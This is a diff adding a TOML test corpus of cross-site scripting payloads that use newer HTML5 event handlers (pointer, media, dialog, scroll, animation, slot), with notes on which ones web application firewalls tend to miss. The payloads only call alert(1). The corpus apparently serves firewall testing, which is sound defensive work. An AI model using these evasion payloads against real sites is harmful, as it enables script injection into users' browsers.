@@ -1,0 +1,148 @@
+schema = 1
+# XSS — modern HTML5 / Pointer Events / autoplay / lazy-loading
+# event handlers. WAF rule corpora typically pin the older event
+# set (onclick / onload / onerror / onmouseover); these newer
+# handlers fire in the same DOM context but rule-corpus blind
+# spots.
+
+# ── Pointer Events (level 2) ──
+
+[[case]]
+id = "onpointermove_image"
+class = "xss"
+payload = "<img src=x onpointermove=alert(1)>"
+description = "onpointermove — fires on mouse / touch / pen movement;  modern WAFs rarely catch"
+
+[[case]]
+id = "onpointerdown_input"
+class = "xss"
+payload = "<input onpointerdown=alert(1)>"
+description = "onpointerdown — fires on click via pointer event API"
+
+[[case]]
+id = "onpointerenter_div"
+class = "xss"
+payload = "<div onpointerenter=alert(1)>x</div>"
+description = "onpointerenter — fires when cursor enters element"
+
+[[case]]
+id = "ongotpointercapture_button"
+class = "xss"
+payload = "<button ongotpointercapture=alert(1)>x</button>"
+description = "ongotpointercapture — rare event, even rarer in WAF  blocklists; fires when element captures pointer"
+
+# ── Media (lazy-loading / autoplay) ──
+
+[[case]]
+id = "onloadstart_video"
+class = "xss"
+payload = "<video onloadstart=alert(1) src=#>"
+description = "<video> with onloadstart — fires when load begins;  no need for the user to interact"
+
+[[case]]
+id = "onplay_video_autoplay"
+class = "xss"
+payload = "<video onplay=alert(1) src=# autoplay>"
+description = "<video> + onplay + autoplay — auto-fires once src loads"
+
+[[case]]
+id = "oncanplay_audio"
+class = "xss"
+payload = "<audio oncanplay=alert(1) src=# autoplay>"
+description = "<audio> + oncanplay — fires when enough data is loaded"
+
+[[case]]
+id = "onstalled_video"
+class = "xss"
+payload = "<video onstalled=alert(1) src=//bad>"
+description = "<video> + onstalled — fires when fetching is stalled;  attacker-host'd src controls timing"
+
+# ── Lazy-loading image errors ──
+
+[[case]]
+id = "onerror_loading_lazy"
+class = "xss"
+payload = "<img loading=lazy onerror=alert(1) src=x>"
+description = "Lazy-loaded image; viewport scroll triggers load →  onerror fires; WAFs may not match the loading=lazy combo"
+
+[[case]]
+id = "onerror_with_data_uri_decode"
+class = "xss"
+payload = "<img src=\"data:,\" onerror=\"alert(1)\">"
+description = "data: URI src with empty payload — fails the load,  fires onerror; canonical but with a twist via data: URI"
+
+# ── Iframe / object / embed events ──
+
+[[case]]
+id = "object_onerror"
+class = "xss"
+payload = "<object data=x onerror=alert(1)></object>"
+description = "<object> with onerror — alternative to <img>, lower  rule-corpus coverage"
+
+[[case]]
+id = "iframe_onload_attribute"
+class = "xss"
+payload = "<iframe srcdoc=\"<svg onload=alert(1)>\"></iframe>"
+description = "iframe srcdoc with inline SVG — defeats WAFs that scan  the OUTER iframe content but not the embedded srcdoc"
+
+[[case]]
+id = "embed_onerror"
+class = "xss"
+payload = "<embed src=x onerror=alert(1)>"
+description = "<embed> with onerror — niche tag, low rule coverage"
+
+# ── Drag-and-drop ──
+
+[[case]]
+id = "ondragstart_attr"
+class = "xss"
+payload = "<a draggable=true ondragstart=alert(1)>drag</a>"
+description = "ondragstart — fires on user drag; requires interaction  but slips through automatic WAF rules"
+
+[[case]]
+id = "ondrop_target"
+class = "xss"
+payload = "<div ondragover=\"event.preventDefault()\" ondrop=alert(1)>drop here</div>"
+description = "ondrop pair — fires on drag-drop completion"
+
+# ── Form/Input new events ──
+
+[[case]]
+id = "onbeforetoggle_dialog"
+class = "xss"
+payload = "<dialog onbeforetoggle=alert(1)>x</dialog>"
+description = "onbeforetoggle — new HTML invokers spec; <dialog>/popover  trigger this; modern Chrome supports"
+
+[[case]]
+id = "ontoggle_details"
+class = "xss"
+payload = "<details ontoggle=alert(1) open>x</details>"
+description = "<details> ontoggle — fires when details opens; can be  set open by default in payload"
+
+[[case]]
+id = "oncancel_dialog"
+class = "xss"
+payload = "<dialog oncancel=alert(1) open>x</dialog>"
+description = "<dialog> oncancel — fires on Escape key inside dialog"
+
+# ── Scroll / animation ──
+
+[[case]]
+id = "onscrollend"
+class = "xss"
+payload = "<div style=\"overflow:auto;height:1px\" onscrollend=alert(1)><div style=\"height:100px\"></div></div>"
+description = "onscrollend — new spec event (2024); fires after scrolling  ends; near-zero WAF coverage"
+
+[[case]]
+id = "onanimationend_keyframes"
+class = "xss"
+payload = "<style>@keyframes x{0%{}}</style><div style=\"animation:x 0.1s\" onanimationend=alert(1)></div>"
+description = "onanimationend with inline keyframes — CSS animation  fires; defeats WAFs that don't model CSS animation"
+
+# ── Web Components / Slot ──
+
+[[case]]
+id = "onslotchange_slot"
+class = "xss"
+payload = "<x-el><span slot=foo onslotchange=alert(1)>x</span></x-el>"
+description = "onslotchange — fires when slotted content changes; rare  event, lower rule corpus"
